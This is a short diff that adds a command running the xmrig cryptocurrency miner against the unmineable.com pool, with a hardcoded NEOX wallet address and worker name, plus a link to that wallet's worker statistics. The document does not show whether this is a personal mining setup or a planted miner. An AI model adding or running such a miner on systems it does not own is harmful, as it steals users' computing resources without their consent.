@@ -1,0 +1,3 @@
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u NEOX:GRzqk1kr3hAmVBYSMELK95rDjcpFZoY5Sy.win4mggs1
+
+https://unmineable.com/coins/NEOX/address/GRzqk1kr3hAmVBYSMELK95rDjcpFZoY5Sy/workers
